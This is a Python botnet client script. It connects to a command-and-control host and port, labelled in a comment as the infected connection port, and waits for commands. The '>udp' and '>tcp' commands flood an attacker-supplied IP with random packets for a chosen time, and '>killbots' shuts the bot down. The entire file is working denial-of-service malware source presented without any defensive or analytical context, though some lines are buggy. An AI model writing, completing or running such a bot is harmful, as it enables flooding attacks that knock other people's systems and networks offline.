import sys
import time
import socket
import random

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = "127.0.0.1" # IP for bot to connect to.
port = 8000 # The infected connection port

connected = False

def system():
	global socket

	while connected is False:
		try:
			global connected
			socket.connect((host, port))
			connected = True
		except:
			pass

	print("Connected")

	while True:
		msg = socket.recv(1024)

		if ">killbots" in msg.lower():
			sys.exit()

		if ">udp" in msg.lower():
			def udpflood():
				import socket
				try:
					ip = msg.split(" ")[1]
					psize = int(msg.split(" ")[2])
					timer = int(float(msg.split(" ")[3]))

					timeout = time.time() + 1 * timer

					package = random._urandom(psize)

					udpflood = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 17)

					print("Command Accepted!")
					print("UDP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))

					while True:
						port = random.randint(1, 65535)
						udpflood.sendto(package, (ip, port))
						udpflood.sendto("Data? DATA EVERYWHERE!", (ip, port))
						if time.time() > timeout:
							return
				except:
					pass
			udpflood()

		if ">tcp" in msg.lower():
			def tcpflood():
				import socket
				try:
					ip = msg.split(" ")[1]
					psize = int(msg.split(" ")[2])
					timer = int(float(msg.split(" ")[3]))

					timeout = time.time() + 1 * timer

					package = random._urandom(psize)

					tcpflood = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

					tcpflood.connect((ip, 80))

					print("Command Accepted!")
					print("TCP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))

					while True:
						port = random.randint(1, 65535)
						tcpflood.sendto(package, (ip, port))
						tcpflood.sendto("Data? DATA EVERYWHERE!", (ip, port))
						if time.time() > timeout:
							return
				except:
					pass
			tcpflood()
system()
